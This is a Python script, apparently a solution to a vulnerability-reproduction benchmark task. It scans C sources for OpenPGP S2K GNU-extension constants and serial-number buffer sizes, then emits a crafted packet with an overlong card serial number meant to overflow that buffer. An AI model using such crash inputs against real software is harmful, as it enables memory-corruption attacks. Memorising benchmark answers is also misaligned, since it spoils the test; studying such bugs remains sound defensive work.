import os
import re
import tarfile
from typing import Dict, List, Optional, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        files = self._read_sources(src_path)

        defines = self._extract_defines(files)

        harness = self._find_fuzz_harness(files)

        has_s2k_gnu = self._has_s2k_gnu_artifacts(files, defines)

        bufsize = self._infer_serial_bufsize(files, defines)
        if bufsize is None:
            bufsize = 16

        if has_s2k_gnu or (harness and ("s2k" in harness[1].lower() or "openpgp" in harness[1].lower())):
            s2k_gnu_mode = self._infer_s2k_gnu_mode(defines, files)
            card_mode = self._infer_s2k_gnu_card_mode(defines, files)
            hash_algo = self._infer_hash_algo(defines, files)

            serial_len = max(20, bufsize + 1)
            if serial_len > 250:
                serial_len = 250

            return bytes([s2k_gnu_mode, hash_algo]) + b"GNU" + bytes([card_mode, serial_len]) + (b"0" * serial_len)

        if harness and self._harness_looks_lenprefixed_serial(harness[1]):
            serial_len = max(26, bufsize + 1)
            if serial_len > 250:
                serial_len = 250
            return bytes([serial_len]) + (b"A" * serial_len)

        # Fallback: plain overlong "serial number" string
        l = max(27, bufsize + 1)
        if l > 512:
            l = 512
        return b"A" * l

    def _read_sources(self, src_path: str) -> List[Tuple[str, str]]:
        if os.path.isdir(src_path):
            return self._read_sources_from_dir(src_path)
        return self._read_sources_from_tar(src_path)

    def _read_sources_from_dir(self, root: str) -> List[Tuple[str, str]]:
        out: List[Tuple[str, str]] = []
        exts = {".c", ".h", ".cc", ".cpp", ".cxx", ".hh", ".hpp", ".inc", ".y", ".l"}
        max_files = 3000
        max_size = 2_000_000
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if len(out) >= max_files:
                    return out
                _, ext = os.path.splitext(fn)
                if ext.lower() not in exts:
                    continue
                path = os.path.join(dirpath, fn)
                try:
                    st = os.stat(path)
                    if st.st_size <= 0 or st.st_size > max_size:
                        continue
                    with open(path, "rb") as f:
                        data = f.read()
                    out.append((os.path.relpath(path, root), data.decode("latin-1", "ignore")))
                except OSError:
                    continue
        return out

    def _read_sources_from_tar(self, tar_path: str) -> List[Tuple[str, str]]:
        out: List[Tuple[str, str]] = []
        exts = {".c", ".h", ".cc", ".cpp", ".cxx", ".hh", ".hpp", ".inc", ".y", ".l"}
        max_files = 4000
        max_size = 2_000_000
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                for m in tf.getmembers():
                    if len(out) >= max_files:
                        break
                    if not m.isfile():
                        continue
                    if m.size <= 0 or m.size > max_size:
                        continue
                    name = m.name
                    _, ext = os.path.splitext(name)
                    if ext.lower() not in exts:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                        out.append((name, data.decode("latin-1", "ignore")))
                    except Exception:
                        continue
        except Exception:
            return []
        return out

    def _extract_defines(self, files: List[Tuple[str, str]]) -> Dict[str, int]:
        defines: Dict[str, int] = {}
        define_re = re.compile(r"^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.+?)\s*(?:/\*.*)?$", re.M)
        for _, content in files:
            for m in define_re.finditer(content):
                name = m.group(1)
                val = m.group(2).strip()
                ival = self._parse_c_int(val)
                if ival is None:
                    continue
                if 0 <= ival <= 0x7FFFFFFF:
                    if name not in defines:
                        defines[name] = ival
        return defines

    def _parse_c_int(self, s: str) -> Optional[int]:
        s = s.strip()
        if not s:
            return None
        s = s.split("//", 1)[0].strip()
        if not s:
            return None
        while s.startswith("(") and s.endswith(")"):
            inner = s[1:-1].strip()
            if not inner:
                break
            s = inner
        m = re.match(r"^(0x[0-9A-Fa-f]+|\d+)", s)
        if not m:
            return None
        token = m.group(1)
        try:
            if token.lower().startswith("0x"):
                return int(token, 16)
            return int(token, 10)
        except Exception:
            return None

    def _find_fuzz_harness(self, files: List[Tuple[str, str]]) -> Optional[Tuple[str, str]]:
        best: Optional[Tuple[str, str]] = None
        for name, content in files:
            if "LLVMFuzzerTestOneInput" in content:
                if best is None:
                    best = (name, content)
                else:
                    if ("s2k" in content.lower()) and ("s2k" not in best[1].lower()):
                        best = (name, content)
        return best

    def _has_s2k_gnu_artifacts(self, files: List[Tuple[str, str]], defines: Dict[str, int]) -> bool:
        for k in defines.keys():
            ku = k.upper()
            if "S2K" in ku and "GNU" in ku and (defines.get(k, 0) in (101, 0x65)):
                return True
        for _, content in files:
            c = content
            cu = c.upper()
            if "S2K" in cu and ("\"GNU\"" in c or "'GNU'" in c or "memcmp" in cu and "GNU" in cu):
                return True
        return False

    def _infer_s2k_gnu_mode(self, defines: Dict[str, int], files: List[Tuple[str, str]]) -> int:
        candidates = []
        for k, v in defines.items():
            ku = k.upper()
            if "S2K" in ku and "GNU" in ku and "MODE" in ku and 0 <= v <= 255:
                candidates.append((k, v))
            elif ku in ("S2K_GNU", "S2KEXT_GNU", "S2K_MODE_GNU") and 0 <= v <= 255:
                candidates.append((k, v))
        for _, v in candidates:
            if v in (101, 0x65):
                return v
        for _, v in candidates:
            if 0 <= v <= 255:
                return v
        # heuristic from OpenPGP GNU extensions
        return 0x65

    def _infer_s2k_gnu_card_mode(self, defines: Dict[str, int], files: List[Tuple[str, str]]) -> int:
        candidates = []
        for k, v in defines.items():
            ku = k.upper()
            if "S2K" in ku and "GNU" in ku and "CARD" in ku and 0 <= v <= 255:
                candidates.append((k, v))
            if "GNU" in ku and "S2K" in ku and ("SERIAL" in ku or "SERNO" in ku) and 0 <= v <= 255:
                candidates.append((k, v))
        for _, v in candidates:
            if v in (2, 3, 1):
                return v
        if candidates:
            return candidates[0][1]
        return 2

    def _infer_hash_algo(self, defines: Dict[str, int], files: List[Tuple[str, str]]) -> int:
        # Prefer SHA1 (commonly 2) or SHA256 (8)
        for k, v in defines.items():
            ku = k.upper()
            if ku in ("DIGEST_ALGO_SHA1", "GCRY_MD_SHA1") and 0 <= v <= 255:
                return v
        for k, v in defines.items():
            ku = k.upper()
            if ku in ("DIGEST_ALGO_SHA256", "GCRY_MD_SHA256") and 0 <= v <= 255:
                return v
        return 2

    def _infer_serial_bufsize(self, files: List[Tuple[str, str]], defines: Dict[str, int]) -> Optional[int]:
        best: Optional[int] = None

        def consider(sz: int) -> None:
            nonlocal best
            if sz <= 0 or sz > 2048:
                return
            if best is None or sz < best:
                best = sz

        # Search in files likely relevant
        for _, content in files:
            low = content.lower()
            if "serial" not in low:
                continue
            if "s2k" not in low and "openpgp" not in low and "gnu" not in low:
                continue

            # char serialno[...];
            for m in re.finditer(r"\bchar\s+\w*serial\w*\s*\[\s*([A-Za-z_]\w*|\d+)\s*\]\s*;", content):
                tok = m.group(1)
                if tok.isdigit():
                    consider(int(tok))
                else:
                    v = defines.get(tok)
                    if v is not None:
                        consider(v)

            # unsigned char serialno[...];
            for m in re.finditer(r"\bunsigned\s+char\s+\w*serial\w*\s*\[\s*([A-Za-z_]\w*|\d+)\s*\]\s*;", content):
                tok = m.group(1)
                if tok.isdigit():
                    consider(int(tok))
                else:
                    v = defines.get(tok)
                    if v is not None:
                        consider(v)

            # gpg-specific: serial buffer may be referenced via MAX_*SERIAL*
            for m in re.finditer(r"\b(MAX_[A-Za-z_]*SERIAL[A-Za-z_]*|[A-Za-z_]*SERIAL[A-Za-z_]*_MAX)\b", content):
                tok = m.group(1)
                v = defines.get(tok)
                if v is not None:
                    consider(v)

        # Global define hints
        for k, v in defines.items():
            ku = k.upper()
            if "SERIAL" in ku and ("MAX" in ku or "LEN" in ku) and ("S2K" in ku or "CARD" in ku) and 0 < v <= 512:
                consider(v)

        return best

    def _harness_looks_lenprefixed_serial(self, content: str) -> bool:
        low = content.lower()
        if "serial" not in low and "serno" not in low:
            return False
        if re.search(r"\bData\s*\[\s*0\s*\]", content) and re.search(r"\bData\s*\+\s*1\b", content):
            return True
        if re.search(r"\bdata\s*\[\s*0\s*\]", low) and re.search(r"\bdata\s*\+\s*1\b", low):
            return True
        if re.search(r"\bSize\s*>\s*0\b", content) and re.search(r"\bData\s*\+\s*1\b", content):
            return True
        return False